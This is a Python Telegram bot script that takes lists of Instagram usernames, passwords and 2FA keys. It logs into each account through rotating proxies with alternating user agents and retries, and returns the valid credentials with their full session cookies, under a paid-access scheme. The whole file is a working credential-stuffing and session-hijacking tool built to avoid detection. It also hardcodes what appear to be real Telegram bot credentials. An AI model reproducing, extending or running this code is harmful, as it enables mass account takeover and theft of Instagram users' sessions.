#!/data/data/com.termux/files/usr/bin/python3
"""
Instagram Premium Bot V8 (Hardcore Login & Proxy Rotation)
Features:
- Auto Retry on Login Fail (3 attempts with different IPs)
- Dual User Agent Strategy (Mobile + Desktop)
- Full Cookie Extraction (rur, shbid, shbts)
- Dynamic Thread & Proxy Control (/on, /off)
- GitHub Database Persistence
"""

import os
import sys
import asyncio
import logging
import subprocess
import time
import re
import uuid
import secrets
import random
import json
import base64
from datetime import datetime, timedelta
from pathlib import Path

# ============================================
# SECTION 1: DEPENDENCIES & CONFIG
# ============================================

def install_dependencies():
    required = ['pyrogram', 'tgcrypto', 'instaloader', 'pyotp', 'requests']
    for pkg in required:
        try:
            __import__(pkg)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

install_dependencies()

from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
import instaloader
from instaloader import TwoFactorAuthRequiredException, BadCredentialsException, ConnectionException
import pyotp
import requests

class Config:
    API_ID = 36021238
    API_HASH = "8f9bf7770e5b58b550030bcbaa0ec7d7"
    BOT_TOKEN = "8274795288:AAHDbqKWe1XpM4_xJppY9PED_1TtmAeCX1o"
    
    ADMIN_ID = 6323050876
    CHANNEL_ID = -1003375283491
    CHANNEL_LINK = "https://t.me/Sheet_short_update"
    
    SESSION_NAME = "ig_hardcore_v8"
    WORKDIR = Path("ig_data")
    WORKDIR.mkdir(exist_ok=True)
    
    # ---------------------------------------------------------
    # GITHUB DATABASE CONFIGURATION
    # ---------------------------------------------------------
    GITHUB_TOKEN = "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" 
    GITHUB_REPO = "YourUsername/YourRepoName" 
    DB_FILENAME = "users_db.json"
    # ---------------------------------------------------------

# NEW: Global State for Proxy and Threads
class GlobalState:
    USE_PROXY = True
    THREADS = 20

logging.basicConfig(level=logging.ERROR)

# ============================================
# SECTION 2: GITHUB DATABASE LOGIC
# ============================================

class GitHubDB:
    def __init__(self):
        self.api_url = f"https://api.github.com/repos/{Config.GITHUB_REPO}/contents/{Config.DB_FILENAME}"
        self.headers = {
            "Authorization": f"token {Config.GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }
        self.local_cache = {}
        self.load_from_github()

    def load_from_github(self):
        try:
            r = requests.get(self.api_url, headers=self.headers)
            if r.status_code == 200:
                content = r.json().get("content", "")
                if content:
                    decoded = base64.b64decode(content).decode("utf-8")
                    self.local_cache = json.loads(decoded)
                    print("✅ Database loaded.")
                else:
                    self.local_cache = {}
            else:
                self.local_cache = {}
        except:
            self.local_cache = {}

    def save_to_github(self):
        try:
            r = requests.get(self.api_url, headers=self.headers)
            sha = r.json().get("sha") if r.status_code == 200 else None
            
            json_str = json.dumps(self.local_cache, indent=2)
            b64_content = base64.b64encode(json_str.encode("utf-8")).decode("utf-8")
            
            data = {"message": "Update DB", "content": b64_content}
            if sha: data["sha"] = sha
            requests.put(self.api_url, headers=self.headers, json=data)
        except: pass

    def set_access(self, user_id, seconds, limit):
        self.local_cache[str(user_id)] = {"expiry": time.time() + seconds, "limit": limit}
        self.save_to_github()

    def get_user(self, user_id):
        return self.local_cache.get(str(user_id))

    def remove_user(self, user_id):
        if str(user_id) in self.local_cache:
            del self.local_cache[str(user_id)]
            self.save_to_github()
            return True
        return False

    def get_all(self): return self.local_cache

db = GitHubDB()

def check_access(user_id):
    if user_id == Config.ADMIN_ID: return True, "Admin", 999999
    user_data = db.get_user(user_id)
    if not user_data: return False, "No Access", 0
    rem = user_data.get("expiry", 0) - time.time()
    if rem > 0: return True, format_remaining_time(rem), user_data.get("limit", 100)
    else:
        db.remove_user(user_id)
        return False, "Expired", 0

def format_remaining_time(seconds):
    td = timedelta(seconds=seconds)
    return f"{td.days}d {td.seconds//3600}h"

# ============================================
# SECTION 3: PROXY & ENGINE (HARDCORE MODE)
# ============================================

def load_proxies():
    p_file = Path("proxies.txt")
    if not p_file.exists(): return []
    proxies = []
    with open(p_file, "r") as f:
        for line in f:
            l = line.strip()
            if not l: continue
            if '@' in l or l.startswith('http'): proxies.append(f"http://{l}")
            elif len(l.split(':')) == 2: proxies.append(f"http://{l}")
            elif len(l.split(':')) == 4:
                p = l.split(':')
                proxies.append(f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}")
    return proxies

PROXY_LIST = load_proxies()

def get_headers(mobile=False):
    if mobile:
        return {
            'User-Agent': 'Instagram 269.0.0.18.75 Android (26/8.0.0; 480dpi; 1080x1920; Samsung; SM-G973F; beyond1; exynos9820; en_US; 314665256)',
            'Accept-Language': 'en-US',
            'X-IG-App-ID': '936619743392459',
        }
    else:
        return {
            'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(120, 125)}.0.0.0 Safari/537.36',
            'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124"',
            'Sec-Fetch-Site': 'same-origin',
            'Upgrade-Insecure-Requests': '1'
        }

# --- Login Logic with Retry ---
def attempt_login(u, p, k, use_mobile_ua=False):
    """
    Attempts to login. If proxy enabled, it picks a random one.
    Returns: (Success_Bool, Result_String)
    """
    ua = get_headers(mobile=use_mobile_ua)
    L = instaloader.Instaloader(quiet=True, user_agent=ua['User-Agent'], max_connection_attempts=1)
    L.context._session.headers.update(ua)
    
    if PROXY_LIST and GlobalState.USE_PROXY:
        prx = random.choice(PROXY_LIST)
        L.context._session.proxies = {"http": prx, "https": prx}

    try:
        try:
            L.login(u, p)
        except TwoFactorAuthRequiredException:
            if k:
                try: L.two_factor_login(pyotp.TOTP(str(k).replace(" ", "").strip().upper()).now())
                except: return False, "2FA_FAIL"
            else: return False, "NEEDS_2FA"
        except BadCredentialsException: return False, "WRONG_PASS"
        except ConnectionException: return False, "PROXY_ERROR" # Important for retry
        except Exception as e:
            if "checkpoint" in str(e).lower(): return False, "CHECKPOINT"
            return False, "ERROR"

        # Force Full Cookies (RUR, SHBID)
        try: L.context._session.get("https://www.instagram.com/")
        except: pass
        
        # Profile Hit to ensure session validity
        try: instaloader.Profile.from_username(L.context, u)
        except: pass # Sometimes fails but cookie is still valid

        cookies = L.context._session.cookies.get_dict()
        
        # Must have sessionid
        if 'sessionid' not in cookies: return False, "NO_SESSION"

        # Generate Extras if missing
        if 'ig_did' not in cookies: cookies['ig_did'] = str(uuid.uuid4()).upper()
        if 'datr' not in cookies: cookies['datr'] = secrets.token_hex(12)
        if 'rur' not in cookies: cookies['rur'] = "NA" # Fallback

        # Priority List
        prio = ['csrftoken', 'datr', 'ig_did', 'mid', 'ds_user_id', 'sessionid', 'rur', 'shbid', 'shbts']
        parts = [f"{k}={cookies[k]}" for k in prio if k in cookies]
        for k,v in cookies.items():
            if k not in prio: parts.append(f"{k}={v}")
            
        return True, f"{u}|{p}|{'; '.join(parts)}"
        
    except: return False, "UNKNOWN"

def process_account_hardcore(u, p, k):
    # Retry Logic: Try up to 3 times with different IPs
    max_retries = 3
    
    for i in range(max_retries):
        # Alternate User Agents (Desktop -> Mobile -> Desktop)
        use_mobile = (i % 2 != 0) 
        
        success, res = attempt_login(u, p, k, use_mobile_ua=use_mobile)
        
        if success:
            return True, res
        
        # If Wrong Password or 2FA Fail, no point retrying
        if "WRONG_PASS" in res or "NEEDS_2FA" in res or "2FA_FAIL" in res:
            return False, f"{u}|{p}|{res}"
            
        # If Proxy Error or Checkpoint or Unknown, Retry
        time.sleep(random.uniform(1, 3))
    
    return False, f"{u}|{p}|FAILED_AFTER_RETRIES"

# ============================================
# SECTION 4: BOT COMMANDS
# ============================================

app = Client(Config.SESSION_NAME, api_id=Config.API_ID, api_hash=Config.API_HASH, bot_token=Config.BOT_TOKEN)

async def check_permissions(client, user_id):
    if user_id == Config.ADMIN_ID: return True, "Admin", 999999
    h, e, l = check_access(user_id)
    if not h: return False, "expired", 0
    try:
        await client.get_chat_member(Config.CHANNEL_ID, user_id)
        return True, e, l
    except: return False, "not_joined", 0

@app.on_message(filters.command("start"))
async def start(client, message):
    user_id = message.from_user.id
    is_valid, status, limit = await check_permissions(client, user_id)
    global PROXY_LIST; PROXY_LIST = load_proxies()
    
    if is_valid:
        pmode = "✅ ON" if GlobalState.USE_PROXY else "❌ OFF"
        await message.reply_text(
            f"💠 **IG HARDCORE BOT V8** 💠\n\n"
            f"🛡️ Status: `Active`\n"
            f"⏳ Expiry: `{status}`\n"
            f"🌐 Proxies: `{len(PROXY_LIST)}` ({pmode})\n"
            f"⚡ Threads: `{GlobalState.THREADS}`\n\n"
            f"🔄 **Retry Mode:** Enabled (3x)\n"
            f"📝 Send `User Pass` or `User Pass Key`"
        )
    elif status == "not_joined":
        btn = InlineKeyboardMarkup([[InlineKeyboardButton("📢 Join Channel", url=Config.CHANNEL_LINK)],[InlineKeyboardButton("✅ Verify", callback_data="verify_join")]])
        await message.reply_text("🚫 Join Channel First", reply_markup=btn)
    else: await message.reply_text("🔒 Access Denied")

@app.on_callback_query(filters.regex("verify_join"))
async def verify(c, q):
    if (await check_permissions(c, q.from_user.id))[0]: await q.message.delete(); await start(c, q.message)
    else: await q.answer("❌ Not Joined!", show_alert=True)

@app.on_message(filters.command(["on", "off"]) & filters.user(Config.ADMIN_ID))
async def switch(c, m):
    if "proxies" in m.text:
        GlobalState.USE_PROXY = (m.command[0] == "on")
        GlobalState.THREADS = 20 if GlobalState.USE_PROXY else 5
        await m.reply(f"✅ Proxies: {GlobalState.USE_PROXY} | Threads: {GlobalState.THREADS}")

@app.on_message(filters.command("access") & filters.user(Config.ADMIN_ID))
async def access(c, m):
    try:
        args = m.command; t, d, l = int(args[1]), args[2].lower(), int(args[3])
        sec = int(re.match(r"(\d+)", d).group(1)) * (86400 if 'd' in d else 3600)
        db.set_access(t, sec, l)
        await m.reply(f"✅ Given: {t} | {d} | {l} Limit")
    except: await m.reply("❌ Error")

@app.on_message(filters.command("ban") & filters.user(Config.ADMIN_ID))
async def ban(c, m):
    db.remove_user(int(m.command[1])); await m.reply("🚫 Banned")

@app.on_message(filters.command("users") & filters.user(Config.ADMIN_ID))
async def users(c, m):
    u = db.get_all()
    txt = "\n".join([f"`{k}`" for k in u.keys()]) if u else "Empty"
    await m.reply(f"👥 Users:\n{txt}")

@app.on_message(filters.text & filters.private)
async def handle(c, m):
    if m.text.startswith("/"): return
    uid = m.from_user.id
    v, s, lim = await check_permissions(c, uid)
    if not v: return await m.reply("🚫 Access Denied")
    
    lines = [l for l in m.text.split('\n') if l.strip()]
    if len(lines) > lim: return await m.reply(f"⛔ Limit: {lim}")
    if not PROXY_LIST and GlobalState.USE_PROXY: return await m.reply("⚠️ Proxies Offline")

    msg = await m.reply(f"💎 **Processing...**\nTarget: `{len(lines)}`\nMode: Hardcore (3x Retry)")
    
    valid, processed = [], 0
    sem = asyncio.Semaphore(GlobalState.THREADS)
    loop = asyncio.get_running_loop()
    last = time.time()

    async def worker(line):
        nonlocal processed, last
        async with sem:
            try:
                p = line.strip().split(None, 2)
                if len(p) >= 2:
                    u, pw = p[0], p[1]
                    k = p[2] if len(p) > 2 else None
                    ok, res = await loop.run_in_executor(None, process_account_hardcore, u, pw, k)
                    if ok: valid.append(res)
                processed += 1
                if time.time() - last > 3 or processed == len(lines):
                    try: await msg.edit(f"💎 **Running...**\n✅ Valid: {len(valid)}\n🔄 Done: {processed}/{len(lines)}"); last = time.time()
                    except: pass
            except: processed += 1

    await asyncio.gather(*[worker(l) for l in lines])
    
    if valid:
        f = f"Cookies_{datetime.now().strftime('%H%M')}.txt"
        with open(f, "w") as fl: fl.write("\n".join(valid))
        await m.reply_document(f, caption=f"✅ **Done:** {len(valid)}")
        os.remove(f)
    else: await msg.edit("❌ All Failed.")

if __name__ == "__main__":
    print("🔥 Hardcore Bot V8 Started...")
    app.run()
